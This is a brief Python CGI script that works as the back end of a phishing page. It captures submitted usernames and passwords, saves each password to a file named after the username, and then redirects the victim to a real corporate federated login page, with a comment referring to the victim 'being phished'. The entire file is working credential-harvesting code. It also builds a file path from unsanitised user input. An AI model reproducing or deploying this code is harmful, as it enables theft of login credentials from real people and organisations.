#!/usr/bin/python 
import sys
import subprocess
import cgi, cgitb
import time

formData = cgi.FieldStorage()
username = str(formData.getvalue('UserName')) #update 
password=str(formData.getvalue('Password'))   #update

with open("/var/www/html/cgi-bin/input/" + username,"a") as f:
    f.write(password)
    f.close()

#subopen = ['python2.7','/var/www/html/cgi-bin/phishphorward.py', username, password]
#subprocess.Popen(subopen, close_fds=True)

time.sleep(10)

redirectURL = "https://federation-sts.accenture.com/adfs/ls/" #redirect to whatever site you want them sent to after being phished
print 'Content-Type: text/html'
print 'Location: %s' % redirectURL
print # HTTP says you have to have a blank line between headers and content
print '<html>'
print '  <head>'
print '    <meta http-equiv="refresh" content="0;url=%s" />' % redirectURL
print '    <title>You are going to be redirected</title>'
print '  </head>'
print '  <body>'
print '    Redirecting... <a href="%s">Click here if you are not redirected</a>' % redirectURL
print '  </body>'
print '</html>'
